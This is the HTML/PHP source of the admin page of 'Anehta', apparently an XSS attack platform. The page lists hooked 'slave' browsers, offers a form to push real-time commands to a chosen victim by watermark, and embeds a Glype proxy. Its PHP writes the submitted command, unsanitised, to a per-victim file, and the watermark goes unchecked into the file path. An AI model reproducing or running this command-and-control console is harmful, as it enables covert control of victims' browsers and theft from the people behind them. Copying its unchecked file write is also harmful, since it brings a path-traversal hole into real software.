<html><meta http-equiv=content-type content="text/html; charset=utf-8">
	<head>
	<script src="library/anehta.js" ></script>
	<script src="library/jQuery.js" ></script>
	<head>
	<body>
<br>===================== Anehta ======================</br>
<br>================ axis@ph4nt0m.org =================</br>
<br>========== http://anehta.googlecode.com ===========</br>
		<p><iframe width=800 height=200 src="slave/index.php" ></iframe></p>
		实时命令控制:
		<form id="realcmd" action="<?php $_SERVER['PHP_SELF']; ?>" method="post">
			<textarea id="cmd" name="cmd" cols=40 rows=6 ></textarea>
			<p>
				WaterMark: <input type=text id="slave" name="slave" value="" />
			  <input type=submit value="FVCK!" />
		  </p>
		</form>
	<br>
	  
	<iframe width=800 height=700 src="tools/glype/index.php" ></iframe>
	  
	</br>
		
		
	</body>
	
</html>

<?php
// 管理后台

if (!empty($_POST["cmd"])){
  $realtime_cmd = $_POST["cmd"];
  $slavewatermark = $_POST["slave"]; 
  
  $fp = fopen("slave\\$slavewatermark\\realtimecmd.txt", "w+");

  fwrite($fp, urldecode($realtime_cmd));

  fclose($fp);
}

?>

